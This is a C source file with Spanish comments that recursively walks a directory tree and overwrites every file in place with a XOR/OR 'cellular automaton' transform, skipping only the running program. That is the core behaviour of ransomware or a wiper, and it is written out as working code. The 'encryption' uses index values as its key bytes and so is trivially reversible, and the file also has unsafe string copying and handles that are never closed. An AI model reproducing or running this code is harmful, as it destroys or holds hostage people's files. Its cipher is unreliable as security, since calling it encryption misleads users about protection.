#include "encrypt.h"

off_t fsize(const char* filename) {
	/*
	* Retorna el tamanio de un archivo
	*/
	struct stat st;

	if (stat(filename, &st) == 0)
		return st.st_size;

	return -1;
}

void encrypt(const char* file, FILE* file_fd, int file_len) {
	/*
	* Esta funcion usa un XOR/OR based cellular automata para
	* cifrar y descifrar un archivo
	*/
	char* file_bytes;
	char* file_encrypted_bytes;
	char* bytes_random;

	file_bytes = malloc(file_len + 1);
	file_encrypted_bytes = malloc(file_len + 1);
	bytes_random = malloc(file_len + 1);

	/*
	* Guarda todos los bytes del archivo
	* en el buffer `file_bytes``
	*/
	int i = 0;
	while (1) {
		file_bytes[i] = fgetc(file_fd);
		if (feof(file_fd)) {
			break;
		}
		i++;
	}

	/*
	* Abre el archivo en escritura binaria
	*/
	FILE* encrypted_file;
	encrypted_file = fopen(file, "wb+");

	/*
	* Realiza el proceso de cifrado con los bytes
	* del archivo y escribe los bytes resultantes en el mismo
	*/
	if (file_len > 0) {
		for (int i = 0; i < file_len; i++)
			bytes_random[i] = i;

		// Aqui se aplica el automata celular (regla 39318)
		file_encrypted_bytes[0] = file_bytes[0] ^ bytes_random[1] ^ (bytes_random[file_len - 2] | bytes_random[file_len - 1]);
		file_encrypted_bytes[1] = file_bytes[1] ^ bytes_random[2] ^ (bytes_random[file_len - 1] | bytes_random[0]);
		file_encrypted_bytes[file_len - 1] = file_bytes[file_len - 1] ^ bytes_random[0] ^ (bytes_random[file_len - 3] | bytes_random[file_len - 2]);

		for (int i = 2; i < file_len - 1; i++)
			file_encrypted_bytes[i] = file_bytes[i] ^ bytes_random[i + 1] ^ (bytes_random[i - 2] | bytes_random[i - 1]);

		fwrite(file_encrypted_bytes, 1, file_len, encrypted_file);
		fclose(encrypted_file);
	}

	free(file_bytes);
	free(file_encrypted_bytes);
	free(bytes_random);
}

void encrypt_all(const char* directory, char* current_program) {
	/*
	* Cifra todos los archivos que esten en un directorio
	*/
	FILE* file_fd;
	char path[MAX_BUFF_PATH];
	int file_len;

	DIR* dir;
	struct dirent* ent;

	/*
	* Va cifrando todos los archivos que encuentre en el directorio,
	* y esto lo va haciendo recursivamente
	*/
	if ((dir = opendir(directory)) != NULL) {
		while ((ent = readdir(dir)) != NULL) {
			if (!ent)
				break; // Rompe si no encuentra mas directorios

			/*
			* Omite los parents directory para recorrer los
			* directorios que esten dentro del actual 
			*/
			if (strcmp(ent->d_name, ".") && strcmp(ent->d_name, "..")) {

				/*
				* Crea la ruta real del archivo o directorio
				*/
				strcpy(path, directory);
				strcat(path, "/");
				strcat(path, ent->d_name);

				/*
				* Si se trata de un archivo (diferente al 
				* argv[0]), entonces lo cifra
				*/
				if (ent->d_type != DT_DIR) {
					if (strstr(path, current_program) != NULL) {
						continue;
					} else {
						file_fd = fopen(path, "rb");
						file_len = fsize(path);
						encrypt(path, file_fd, file_len);
					}
				}
				/*
				* Si es un directorio se llama asi mismo para 
				* cifrar los archivos de ese directorio
				*/
				encrypt_all(path, current_program);
			}
		}
		closedir(dir);
	}
}